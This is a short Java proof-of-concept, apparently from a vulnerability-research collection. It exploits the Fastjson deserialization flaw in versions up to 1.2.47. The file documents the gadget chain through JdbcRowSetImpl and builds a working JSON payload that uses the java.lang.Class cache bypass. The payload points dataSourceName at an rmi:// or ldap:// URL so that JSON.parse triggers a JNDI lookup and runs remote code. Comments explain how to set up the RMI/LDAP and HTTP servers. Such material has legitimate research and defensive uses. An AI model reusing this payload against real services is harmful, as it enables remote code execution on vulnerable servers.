package vul.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @ClassName: fastjson1247
 * @Description: TODO 修改pom.xml 中fastjson的版本号 <= 1.2.47
 * @Author: Summer
 * @Date: 2020/7/6 15:24
 * @Version: v1.0.0
 * @Description:
 **/
/**
 * Gadget chain:
 *      JSON.parse()
 *          DefaultJSONParser.parse()
 *              DefaultJSONParser.parseObject()
 *                  JavaBeanDeserializer.deserialze()
 *                      JavaBeanDeserializer.parseRest()
 *                          FieldDeserializer.setValue()
 *                              Reflect.invoke()
 *                                  JdbcRowSetImpl.setAutoCommit()
 *
 */
public class fastjson1247 {

    public static void main(String[] argv) {

        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"summer\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
//            TODO 开启 rmi 或者 ldap服务 和HTTPServer服务 参考fastjson目录下package-info.java
                "\"rmi://localhost:1090/Exploit\",\"autoCommit\":true}}}";
//                "\"ldap://localhost:1389/Summer\",\"autoCommit\":true}}}";

        Object ob = JSON.parse(payload);


    }
}
